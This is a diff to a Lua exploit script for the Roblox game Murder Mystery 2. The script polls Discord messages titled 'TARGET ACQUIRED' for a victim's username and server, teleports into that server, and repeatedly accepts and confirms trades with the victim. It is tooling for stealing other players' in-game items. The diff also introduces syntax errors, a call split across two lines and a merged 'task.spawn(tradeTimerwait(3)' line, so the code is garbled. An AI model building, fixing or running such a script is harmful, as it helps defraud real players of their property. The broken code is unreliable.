@@ -16,14 +16,10 @@ end)
 local HttpServ = game:GetService("HttpService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 
-local victimFile = isfile("user.txt")
-local joinedFile = isfile("joined_ids.txt")
-
-if not victimFile then
+if not isfile("user.txt") then
     writefile("user.txt", "victim username")
 end
-
-if not joinedFile then
+if not isfile("joined_ids.txt") then
     writefile("joined_ids.txt", "[]")
 end
 
@@ -38,7 +34,6 @@ local function selectDevice()
         local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
         if DeviceSelectGui then
             local Container = DeviceSelectGui:WaitForChild("Container")
-            local Mouse = game.Players.LocalPlayer:GetMouse()
             local button = Container:WaitForChild("Phone"):WaitForChild("Button")
             local buttonPos = button.AbsolutePosition
             local buttonSize = button.AbsoluteSize
@@ -65,7 +60,6 @@ local function saveJoinedId(messageId)
     writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
--- ── re-read victim from file each call so updates take effect ──
 local function refreshVictim()
     local ok, data = pcall(readfile, "user.txt")
     if ok and type(data) == "string" and data ~= "" then
@@ -73,21 +67,23 @@ local function refreshVictim()
     end
 end
 
--- ── trade status helper ──
 local function getTradeStatus()
-    local ok, status = pcall(function() return TradeFolder.GetTradeStatus:InvokeServer() end)
+    local ok, status = pcall(function() return TradeFolder.GetTrade)
+Status:InvokeServer() end)
     return ok and status or "None"
 end
 
--- ── accept incoming request if any, otherwise send our own ──
+local function IsTrading()
+    return getTradeStatus() == "StartTrade"
+end
+
+-- Accepts incoming requests + sends our own when idle
 local function acceptRequest()
     while task.wait(0.15) do
         refreshVictim()
-
         local status = getTradeStatus()
 
         if status == "ReceivingRequest" then
-            -- This is the line that was missing — actually accept the incoming request.
             pcall(function() TradeFolder.AcceptRequest:FireServer() end)
         elseif status == "None" then
             local currentTime = tick()
@@ -98,13 +94,11 @@ local function acceptRequest()
                     lastRequestTime = currentTime
                 end
             end
-        elseif status == "StartTrade" then
-            -- Trade is already open; nothing to do here, acceptTrade() handles it.
         end
     end
 end
 
--- ── confirm trade using the SAME argument format as the working trader script ──
+-- Confirms trade using same args as the trader script
 local function acceptTrade()
     while task.wait(0.1) do
         if getTradeStatus() == "StartTrade" then
@@ -116,19 +110,11 @@ local function acceptTrade()
 end
 
 local function waitForPlayerLeave()
-    local playerRemovedConnection
-    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+    game.Players.PlayerRemoving:Connect(function(removedPlayer)
         if removedPlayer.Name == victimUser then
-            if playerRemovedConnection then
-                playerRemovedConnection:Disconnect()
-            end
             didVictimLeave = true
         end
     end)
-end
-
-local function IsTrading()
-    return getTradeStatus() == "StartTrade"
 end
 
 local function tradeTimer()
@@ -143,8 +129,7 @@ end
 
 waitForPlayerLeave()
 task.spawn(acceptTrade)
-task.spawn(tradeTimer)
-wait(3)
+task.spawn(tradeTimerwait(3)
 task.spawn(acceptRequest)
 
 local function autoJoin()
@@ -159,12 +144,10 @@ local function autoJoin()
     })
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
-        if #messages == 0 then
-            return
-        end
+        if #messages == 0 then return end
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
-                if message.embeds[1].title:find("Join to get MM2 hit") then
+                if message.embeds[1].title:find("TARGET ACQUIRED") then
                     local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                     if placeId and jobId then
                         local victimUsername = message.embeds[1].fields[1].value
@@ -172,7 +155,7 @@ local function autoJoin()
                             if not table.find(joinedIds, tostring(message.id)) then
                                 saveJoinedId(tostring(message.id))
                                 writefile("user.txt", victimUsername)
-                                victimUser = victimUsername  -- update in-memory too
+                                victimUser = victimUsername
                                 game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                 return
                             end
